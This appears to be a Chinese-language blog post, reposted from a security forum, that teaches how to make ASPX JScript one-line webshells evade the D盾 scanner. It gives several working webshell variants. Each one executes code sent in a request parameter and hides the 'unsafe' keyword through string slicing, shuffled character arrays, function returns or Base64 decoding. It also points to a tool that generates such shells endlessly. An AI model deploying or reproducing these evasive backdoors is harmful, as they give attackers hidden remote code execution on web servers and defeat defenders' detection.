# 无限免杀D盾脚本之aspx


```
 2019-7-15 自己发在土司的文章
```

##  前言
自己曾经写过一篇文章:利用随机异或无限免杀某盾

php的webshell免杀方法有很多,但是市面上很少有讲aspx免杀的文章.

因为aspx的权限一般较大,对于渗透过程中还是很重要的, 所以就想着写一篇文章来简单的介绍下aspx的免杀
## 0x01 主要方法
```
字符串拼接
函数
数组
Base64编码
```

## 0x02  了解aspx一句话
Aspx的一句话一般是使用Jscript语言实现

看看原本的菜刀aspx一句话
```
<%@ Page Language="Jscript"%> <%eval(Request.Item["pass"],"unsafe");%>
```
其实与php的类似
Eval函数将字符串当做代码执行
不同的是在Jscript中为了安全起见必须使用unsafe参数,才可以使其具有对操作系统操作的功能

Request.Item["pass"] 的pass就是接受的参数 类似于php的$_POST[“pass”]

### Jscript基本用法 
```
Function xxx(){}//声明一个函数
```
### 字符串拼接
```
Var a =’a’+’b’;//a=’ab’;
Var a= ‘\x61’; //a=’a’;
```
### 数组声明
```
Var a=’abc’;
Var b=a(0);//b=’a’;
```
作为免杀来说一般waf杀的都是unsafe这个参数,所以我们的免杀也将从这个参数下手


## 0x02 字符串拼接
经过测试,一般来说把’unsafe’这个字符串无论是十六进制拼接还是直接大小写拼接均不可行
于是想到可以采用substr函数

```
<%@ Page Language="Jscript" Debug=true%>
<%
var a=Request.Form("mr6");
var b='aaaunsaaaafe';
var b=b.substr(3,4)+b.substr(10);
eval(a,b);

%>
```
## 0x03 数组

感觉大多数waf对数组拼接并不感冒,就可以打乱顺序,利用数组进行拼接
```
<%@ Page Language="Jscript" Debug=true%>
<%
var a='efasnu';
var b=Request.Form("mr6");
var c=a(5)+a(4)+a(3)+a(2)+a(1)+a(0);
eval(b,c);
%>
```
## 0x04 函数
因为某盾对字符串拼接杀得比较厉害,放在函数里当做返回值即可
```
<%@ Page Language="Jscript" Debug=true%>
<%
var a=Request.Form("mr6");
function ok()
{
var c="un";
var b="safe";
return c+b;
}
eval(a,ok());

%>
```
## 0x05 BASE64编码
Php中经常使用base64编码来bypass,那么在aspx中如何实现呢

```
var res=System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(‘eXpkZG1yNg==’);//res=’yzddmr6’;
```
那么我们对于unsafe这个特征就可以使用base64编码来绕过
```
<%@ Page Language="Jscript" Debug=true%>
<%
var a=Request.Form("mr6");
var res=System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String('dW5zYWZl'));
eval(a,res);

%>
```
## 0x06 总结

可能是因为aspx的免杀现在还不是很多,所以waf的查杀并不是很严格,不需要太复杂就可以绕过.
对于以上方法还可以连环套用,以达到混淆的效果

自己写了个脚本,利用以上方法来无限生成免杀aspx的webshell

已经放到了自己的项目webshell_venom中
 
 
项目地址:
https://github.com/yzddmr6/webshell-venom

